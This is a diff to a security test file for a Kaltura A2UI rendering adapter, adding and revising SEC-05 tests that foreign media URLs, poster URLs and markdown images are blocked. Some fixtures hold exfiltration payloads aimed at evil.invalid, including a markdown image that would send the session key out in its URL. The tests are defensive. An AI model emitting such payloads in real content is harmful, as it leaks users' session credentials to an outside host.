@@ -11,7 +11,7 @@ import {
   type KalturaError,
 } from '../../src/adapters/react/index';
 import { isAllowedMediaUrl } from '../../src/core/media-url';
-import { basicCatalog } from '@a2ui/react/v0_9';
+import { basicCatalog } from '@a2ui/web_core/v0_9/basic_catalog';
 import { renderMarkdown } from '@a2ui/markdown-it';
 import { renderSurface, type SurfaceOptions } from './surface-helper';
 
@@ -131,6 +131,15 @@ describe.each(MEDIA)('SEC-05: basic %s url', (component, tag, widget) => {
   });
 });
 
+// The 0.13 Video element renders `poster=${props.posterUrl}`, but the v0.9
+// schema has no posterUrl. If this fails, the guard must check posterUrl too.
+describe('SEC-05: basic Video posterUrl', () => {
+  it('SEC-05: the v0.9 schema refuses posterUrl, so the unguarded poster cannot load', async () => {
+    const view = renderSurface(buildKalturaCatalog(), [{ id: 'root', component: 'Video', url: KALTURA_IMG, posterUrl: FOREIGN }]);
+    await expect(view).rejects.toThrow(/posterUrl/);
+  });
+});
+
 describe('SEC-05: setExtraMediaOrigins', () => {
   it.each([['http://media.example.com'], ['https://media.example.com/path'], ['not a url']])(
     'SEC-05: refuses %s',
@@ -162,24 +171,18 @@ describe('SEC-05: the shipped catalogs guard the basic media components', () => 
   });
 
   it.each([
-    [FOREIGN, 0],
-    [KALTURA_IMG, 1],
-  ])('SEC-05: the legacy render path checks %s', async (url, count) => {
-    const { ComponentContext, MessageProcessor } = await import('@a2ui/web_core/v0_9');
-    const catalog = buildKalturaCatalog();
-    const processor = new MessageProcessor([catalog]);
-    processor.processMessages([
-      { version: 'v0.9', createSurface: { surfaceId: 's', catalogId: catalog.id } },
-      { version: 'v0.9', updateComponents: { surfaceId: 's', components: [{ id: 'root', component: 'Image', url }] } },
-    ] as never);
-    const context = new ComponentContext(processor.model.getSurface('s')!, 'root');
-    const { createRoot } = await import('react-dom/client');
-    const { createElement } = await import('react');
-    const host = document.body.appendChild(document.createElement('div'));
-    const root = createRoot(host);
-    mounted.push({ root });
-    await act(async () => root.render(createElement(catalog.components.get('Image')!.render, { context, buildChild: () => null })));
-    expect(host.querySelectorAll('img').length).toBe(count);
+    ['Image', 'kaltura-a2ui-image'],
+    ['Video', 'kaltura-a2ui-video'],
+    ['AudioPlayer', 'kaltura-a2ui-audioplayer'],
+    ['Text', 'kaltura-a2ui-basic-text'],
+  ])('SEC-05: the guarded %s renders under its own tag', (name, tag) => {
+    expect([buildKalturaCatalog().components.get(name), basicCatalog.components.get(name)].map(c => c && 'tagName' in c && c.tagName)).toEqual([tag, tag]);
+  });
+
+  it('SEC-05: the plain basic elements are never defined', async () => {
+    await show('Image', KALTURA_IMG);
+    mounted.push(await renderSurface(kalturaReactCatalog, [{ id: 'root', component: 'Text', text: 'hi' }]));
+    expect(['a2ui-image', 'a2ui-basic-text'].map(tag => customElements.get(tag))).toEqual([undefined, undefined]);
   });
 });
 
@@ -215,6 +218,18 @@ describe('SEC-05: basic Text markdown through the host renderer', () => {
   it('SEC-05: an agent that picks basicCatalog.id gets the same markdown filter', async () => {
     const host = await text(bound('![x](https://evil.invalid/p.png?d=${/session/ks})'), basicCatalog, BOTH);
     expect([host.querySelectorAll('img').length, host.innerHTML.includes(KS)]).toEqual([0, false]);
+  });
+
+  it('SEC-05: a renderer from a Lit context provider gets the same filter', async () => {
+    const host = await text('hi');
+    const element = host.querySelector('kaltura-a2ui-basic-text') as HTMLElement & { markdownRenderer?: unknown; requestUpdate(): void };
+    // What @lit/context consume does for a host provider.
+    element.markdownRenderer = async () => '<img src="https://evil.invalid/p.png">ran';
+    await act(async () => {
+      element.requestUpdate();
+      await new Promise(r => setTimeout(r, 20));
+    });
+    expect([host.querySelectorAll('img').length, host.textContent]).toEqual([0, 'ran']);
   });
 
   it('SEC-05: a Kaltura CDN markdown image still loads', async () => {
